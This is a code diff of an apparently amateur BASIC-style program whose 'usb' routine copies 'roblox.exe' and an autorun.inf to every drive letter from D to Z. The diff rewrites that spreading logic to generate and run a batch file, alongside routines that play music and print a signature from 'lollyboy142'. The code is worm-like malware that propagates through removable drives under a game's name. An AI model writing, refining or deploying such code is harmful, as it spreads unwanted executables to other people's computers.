@@ -18,16 +18,24 @@ Sub MySub
 End Sub
 
 Sub usb
-    Dim drive As String
-    For drive = "D" To "Z" ' Check all possible drive letters
-        If Dir(drive & ":\", vbDirectory) <> "" Then
-            Shell "copy roblox.exe " & drive & ":\"
-            Shell "copy c:\roblox\autorun.inf " & drive & ":\"
-        End If
-    Next drive
+    Dim batchFile As String
+    batchFile = "c:\roblox\usb_copy.bat" ' Path to the batch file
+
+    ' Create the batch file
+    Open batchFile For Output As #1
+    Print #1, "@echo off"
+    Print #1, "for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do ("
+    Print #1, "  if exist %%d:\ ("
+    Print #1, "    copy roblox.exe %%d:\"
+    Print #1, "    copy c:\roblox\autorun.inf %%d:\"
+    Print #1, "  )"
+    Print #1, ")"
+    Close #1
+
+    ' Execute the batch file
+    Shell batchFile
 End Sub
 
-End Sub
 Sub playmusic
     Play "mb"
     Play "o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c#"
@@ -58,7 +66,6 @@ Sub playmusic
     Print "Best Regards,"
     Print "mr.loser AKA lollyboy142"
 End Sub
-
 
 
 
